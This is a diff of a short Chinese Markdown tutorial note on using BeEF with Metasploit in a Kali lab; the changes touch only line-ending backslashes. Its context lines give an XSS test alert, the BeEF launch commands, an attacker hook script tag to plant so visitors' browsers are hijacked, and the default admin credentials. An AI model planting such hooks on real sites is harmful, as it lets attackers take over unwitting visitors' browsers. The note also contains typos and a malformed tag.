@@ -1,6 +1,6 @@
 # beef-xss
 ## XSS反弹
-`<script> alert("hello XSS")</script>` \
+`<script> alert("hello XSS")</script>` 
 ## beef-xss 和 msf框架 组合
 ### 环境要求：
 一台kali: 192.168.200.1
@@ -8,7 +8,7 @@
 运行beef
 `cd /use/share/beef-xss` \
 `./beef` \
-会出现一个攻击地址和一个管理地址
+会出现一个攻击地址和一个管理地址 \
 `192.168.200.1:3000/hoos.js` /攻击地址 \
 `<script>src="192.168.200.1:3000/hoos.js"</script>` /上传这个，有人点击，你就可以通过beef管理进行劫持 \
 `192.168.200.1:3000/ui/panwl` /管理地址，账号密码都是beef \
